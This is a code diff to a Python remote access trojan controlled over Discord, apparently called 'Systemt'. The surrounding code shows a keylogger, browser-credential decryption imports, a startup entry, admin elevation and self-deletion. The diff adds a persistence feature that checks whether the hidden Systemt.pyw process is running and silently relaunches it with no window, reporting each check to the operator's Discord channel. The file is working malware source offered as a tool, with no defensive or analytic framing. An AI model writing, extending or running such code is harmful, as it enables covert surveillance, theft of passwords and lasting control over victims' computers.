@@ -16,6 +16,8 @@ import tempfile
 import win32crypt
 from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
 from cryptography.hazmat.backends import default_backend
+import threading
+import time
 
 # ==================== CONFIG LOADING ====================
 SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
@@ -38,6 +40,12 @@ LOG_CHANNEL_ID = cfg.get("log_channel_id", "")
 DEVICE_NAME = socket.gethostname()
 CURRENT_PID = os.getpid()
 
+# Persistence tracking (defined at module level)
+persistence_enabled = False
+persistence_interval = 60  # default 60 seconds
+persistence_task = None
+script_path = os.path.join(SCRIPT_DIR, "Systemt.pyw")
+
 # Generate unique device ID
 def get_unique_device_id():
     try:
@@ -49,6 +57,72 @@ def get_unique_device_id():
         return f"{DEVICE_NAME}_{CURRENT_PID}"
 
 DEVICE_UNIQUE_ID = get_unique_device_id()
+
+# ==================== PERSISTENCE FUNCTIONS ====================
+def is_pyw_running():
+    """Check if Systemt.pyw is running"""
+    try:
+        for proc in psutil.process_iter(['pid', 'name', 'cmdline']):
+            try:
+                # Check for pythonw.exe or python.exe running Systemt.pyw
+                if proc.info['name'].lower() in ['pythonw.exe', 'python.exe']:
+                    cmdline = ' '.join(proc.info['cmdline'] if proc.info['cmdline'] else [])
+                    if 'Systemt.pyw' in cmdline or 'Systemt.py' in cmdline:
+                        # Don't count current process if it's running as .py
+                        if proc.info['pid'] != CURRENT_PID:
+                            return True
+            except (psutil.NoSuchProcess, psutil.AccessDenied):
+                continue
+        return False
+    except Exception:
+        return False
+
+def restart_pyw():
+    """Restart the pyw script"""
+    try:
+        if os.path.exists(script_path):
+            # Start the pyw script
+            subprocess.Popen(['pythonw', script_path], 
+                           creationflags=subprocess.CREATE_NO_WINDOW if sys.platform == 'win32' else 0)
+            return True
+        return False
+    except Exception:
+        return False
+
+async def persistence_monitor(interval_seconds, channel):
+    """Background task to monitor and restart pyw if needed"""
+    global persistence_enabled
+    
+    while persistence_enabled:
+        try:
+            if not is_pyw_running():
+                # Send notification before restart
+                embed = discord.Embed(
+                    title="🔄 Persistence Triggered",
+                    description=f"Systemt.pyw was not running! Restarting...",
+                    color=discord.Color.orange(),
+                    timestamp=datetime.datetime.now()
+                )
+                embed.add_field(name="Check Interval", value=f"{interval_seconds}s", inline=True)
+                await channel.send(embed=embed)
+                
+                # Restart the script
+                if restart_pyw():
+                    await channel.send("✅ **Systemt.pyw restarted successfully!**")
+                else:
+                    await channel.send("❌ **Failed to restart Systemt.pyw!**")
+            else:
+                # Send check emoji to indicate it's running
+                await channel.send("✅")
+                
+        except Exception as e:
+            try:
+                await channel.send(f"⚠️ Persistence monitor error: {str(e)[:100]}")
+            except:
+                pass
+        
+        # Wait for the specified interval
+        await asyncio.sleep(interval_seconds)
 
 # ==================== BOT SETUP ====================
 intents = discord.Intents.default()
@@ -324,6 +398,7 @@ async def on_ready():
 @bot.event
 async def on_message(message):
     global current_dir, keylogger_active, keylogger, allowed_channels, is_admin, CURRENT_PID
+    global persistence_enabled, persistence_interval, persistence_task  # Now these are defined at module level
     
     if message.author == bot.user:
         return
@@ -340,7 +415,90 @@ async def on_message(message):
     else:
         cmd = content.lower()
     
-    if cmd == "help":
+    # ==================== PERSISTENCE COMMAND ====================
+    if cmd.startswith("persis"):
+        parts = cmd.split()
+        
+        if len(parts) < 2:
+            await message.reply("⚠️ **Usage:** `!persis <seconds>`\nExample: `!persis 60`\n\n**Commands:**\n`!persis stop` - Stop persistence monitoring\n`!persis status` - Check persistence status")
+            return
+        
+        subcmd = parts[1]
+        
+        # Stop persistence
+        if subcmd == "stop":
+            if persistence_enabled:
+                persistence_enabled = False
+                if persistence_task:
+                    persistence_task.cancel()
+                    persistence_task = None
+                await message.reply("⏹️ **Persistence monitoring stopped!**")
+            else:
+                await message.reply("❌ Persistence monitoring is not active!")
+            return
+        
+        # Check status
+        elif subcmd == "status":
+            if persistence_enabled:
+                embed = discord.Embed(title="🛡️ Persistence Status", color=discord.Color.green())
+                embed.add_field(name="Status", value="✅ **ACTIVE**", inline=True)
+                embed.add_field(name="Check Interval", value=f"{persistence_interval} seconds", inline=True)
+                embed.add_field(name="Target Script", value=f"`{script_path}`", inline=False)
+                
+                # Check if pyw is currently running
+                if is_pyw_running():
+                    embed.add_field(name="Systemt.pyw Status", value="🟢 Running", inline=True)
+                else:
+                    embed.add_field(name="Systemt.pyw Status", value="🔴 NOT Running", inline=True)
+                
+                await message.reply(embed=embed)
+            else:
+                embed = discord.Embed(title="🛡️ Persistence Status", color=discord.Color.red())
+                embed.add_field(name="Status", value="❌ **INACTIVE**", inline=True)
+                embed.add_field(name="Use", value=f"`{PREFIX}persis <seconds>` to activate", inline=False)
+                await message.reply(embed=embed)
+            return
+        
+        # Start persistence with interval
+        else:
+            try:
+                interval = int(subcmd)
+                if interval < 5:
+                    await message.reply("⚠️ Minimum interval is 5 seconds!")
+                    return
+                if interval > 3600:
+                    await message.reply("⚠️ Maximum interval is 3600 seconds (1 hour)!")
+                    return
+                
+                # Stop existing persistence if running
+                if persistence_enabled:
+                    persistence_enabled = False
+                    if persistence_task:
+                        persistence_task.cancel()
+                        await asyncio.sleep(1)
+                
+                # Start new persistence
+                persistence_interval = interval
+                persistence_enabled = True
+                
+                # Start monitoring task
+                persistence_task = asyncio.create_task(persistence_monitor(interval, message.channel))
+                
+                embed = discord.Embed(title="🛡️ Persistence Enabled", color=discord.Color.green())
+                embed.add_field(name="Check Interval", value=f"{interval} seconds", inline=True)
+                embed.add_field(name="Target", value=f"`{script_path}`", inline=False)
+                embed.add_field(name="Action", value="Will check if pyw is running and restart if needed", inline=False)
+                embed.set_footer(text=f"Use {PREFIX}persis stop to disable")
+                
+                await message.reply(embed=embed)
+                
+            except ValueError:
+                await message.reply(f"❌ Invalid number: `{subcmd}`\nUse `{PREFIX}persis <seconds>`")
+            except Exception as e:
+                await message.reply(f"❌ Error starting persistence: {str(e)[:100]}")
+        return
+    
+    elif cmd == "help":
         await message.reply(f"""**Systemt Commands** (`{PREFIX}`)
 
 **Device Management:**
@@ -348,6 +506,11 @@ async def on_message(message):
 `device` - This device info
 `startup` - Add to Windows startup
 `uac` - Run as admin
+
+**Persistence:**
+`persis <sec>` - Enable auto-restart monitoring
+`persis stop` - Stop monitoring
+`persis status` - Check status
 
 **Location & Data:**
 `location` - Get approximate location (IP based)
@@ -461,6 +624,7 @@ async def on_message(message):
         embed.add_field(name="Unique ID", value=DEVICE_UNIQUE_ID[-8:], inline=True)
         embed.add_field(name="Admin", value="✅" if is_admin else "❌", inline=True)
         embed.add_field(name="Startup", value="✅" if is_startup_enabled() else "❌", inline=True)
+        embed.add_field(name="Persist", value=f"✅ {persistence_interval}s" if persistence_enabled else "❌", inline=True)
         embed.add_field(name="IP", value=socket.gethostbyname(socket.gethostname()), inline=True)
         embed.add_field(name="Directory", value=current_dir, inline=False)
         embed.add_field(name="My Channel", value=f"#{my_channel.name}", inline=True)
@@ -691,6 +855,11 @@ async def on_message(message):
         return
     
     elif cmd == "exit":
+        # Stop persistence if running
+        if persistence_enabled:
+            persistence_enabled = False
+            if persistence_task:
+                persistence_task.cancel()
         await message.reply("👋 Goodbye!")
         await bot.close()
         sys.exit(0)
@@ -701,6 +870,9 @@ async def on_message(message):
         if keylogger_active and keylogger:
             keylogger.stop()
         try:
+            # Stop persistence
+            if persistence_enabled:
+                persistence_enabled = False
             remove_from_startup()
             shutil.rmtree(SCRIPT_DIR, ignore_errors=True)
         except:
